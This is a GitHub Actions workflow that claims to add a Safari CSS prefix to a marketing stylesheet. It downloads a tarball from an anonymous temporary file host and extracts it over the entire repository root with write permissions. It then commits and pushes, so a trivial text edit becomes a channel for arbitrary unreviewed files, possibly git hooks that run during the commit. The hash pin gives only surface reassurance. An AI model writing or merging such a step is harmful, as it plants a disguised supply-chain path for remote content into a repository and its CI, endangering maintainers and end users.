# TEMPORARY — marketing v5 asset materialisation (delete at merge).
# Rev 9: cross-browser fix — the contact-modal overlay needs
# -webkit-backdrop-filter for Safari. Sha-pinned tarball as before.
# Idempotent: skips when the prefix is already in the stylesheet.
name: marketing v5 assets (temporary)

on:
  push:
    branches: [feat/marketing-v5-2026-06-10]

permissions:
  contents: write

jobs:
  materialise:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Check out the feature branch
        uses: actions/checkout@v4
        with:
          ref: feat/marketing-v5-2026-06-10

      - name: Skip if prefix already present
        id: guard
        run: |
          if grep -q -- '-webkit-backdrop-filter' src/components/marketing/marketing.css; then
            echo 'skip=true' >> "$GITHUB_OUTPUT"
          else
            echo 'skip=false' >> "$GITHUB_OUTPUT"
          fi

      - name: Fetch tarball and verify SHA-256 pin
        if: steps.guard.outputs.skip == 'false'
        run: |
          set -euo pipefail
          curl -fsSL --retry 3 -o /tmp/css.tgz 'https://litter.catbox.moe/2kvy8m.tgz'
          printf '%s  %s\n' '5f19ae8131d9b02c1627dcfe28fdf60fdbd90fc70fe3b1f3a9edf364e97becff' '/tmp/css.tgz' > /tmp/pins.txt
          sha256sum -c /tmp/pins.txt
          tar xzf /tmp/css.tgz -C .

      - name: Commit
        if: steps.guard.outputs.skip == 'false'
        run: |
          set -euo pipefail
          git config user.name 'github-actions[bot]'
          git config user.email 'github-actions[bot]@users.noreply.github.com'
          git add src/components/marketing/marketing.css
          git commit -m 'marketing v5: craft pass - Safari -webkit-backdrop-filter on the modal overlay'
          git push origin HEAD:feat/marketing-v5-2026-06-10
